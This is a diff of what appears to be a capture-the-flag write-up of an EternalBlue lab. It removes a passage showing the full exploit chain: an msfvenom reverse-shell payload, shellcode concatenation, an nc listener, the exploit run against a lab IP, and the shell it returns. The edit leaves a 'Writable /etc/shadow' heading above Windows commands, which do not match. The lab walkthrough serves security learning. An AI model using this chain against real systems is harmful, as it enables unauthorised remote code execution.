@@ -120,34 +120,11 @@ root:$6$Tb/euwmL$*********************************************</code></pre>
 Password:
 root@debian/home/user# whoami
 root</code></pre>
-                
-                
-                <p>I can also see that the "shell_prep.sh" script would have given us options to generate a reverse shell, either a Meterpreter shell or a regular cmd shell, for which it would also generate a raw binary file. Finally, it would have combined this reverse shell binary with the kernel shell code binary. So far, as we are doing this manually, we have only created the shellcode binary, "sc_x64_kernel.bin". We need to create a raw binary of a reverse shell for this exploit to work. Of course I cannot read the binary and I have not read the assembly, but I imagine the kernel shell code takes control of the target system's kernel, perhaps to gain elevated privileges and preparing the system for executing further commands, and will then execute the reverse shell, which we can catch on our local machine. </p>
-                <p>Let us create our reverse shell code binary using <i>msfvenom</i>. Here we create a stageless Windows, 64-bit, reverse-tcp shell, in raw binary format.</p>
-                <pre><code>case@local:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={LOCAL_IP} LPORT=444 -a x64 -f raw -o sc_x64_msf.bin</code></pre>
-                <p>Finally, we need to combine the kernel shellcode exploit binary with the reverse shell binary, again this would have been done by the "shell_prep.sh", but manually is easy too.</p>
-                <pre><code>case@local:~$ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin</code></pre>
-                <p>We now need to run the exploit. The AutoBlue repo also contains an exploit script "eternalblue_exploit7.py". This script is fairly complex, and even with five years of Web Development experience I find it diffcult to understand exactly what is going on here. As far as I can make out, the script loads the binary shellcode file we created earlier (sc_x64.bin), which is the payload, and places it into memory. The shellcode/payload will then execute, providing us with our reverse shell. First then, let us set up a listener on our local/attacking machine.</p>
-                <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
-                <p>We can then run the exploit.</p>
-                <pre><code>case@local:~$ python3 eternalblue_exploit7.py 10.10.34.160 sc_x64.bin</code></pre>
-                <p>We are in!</p>
-                <pre><code>case@local:~$ sudo nc -lvnp 444
-[sudo] password for case: 
-Listening on 0.0.0.0 444
-Connection received on 10.10.34.160 49186
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Windows\system32></code></pre>
-
-
-
-
-
-                
+                <p><strong>Congratulations, you own the system!</strong></p>
             <section id="Three">
-                <h2>Step Three - Escalation and Password Dumping</h2>
+                <h2>Writable /etc/shadow</h2>
+
+                
                 <p>Firstly, let us see which user context our reverse shell is running under.</p>
                 <pre><code>C:\Windows\system32>cmd.exe /c whoami
 cmd.exe /c whoami
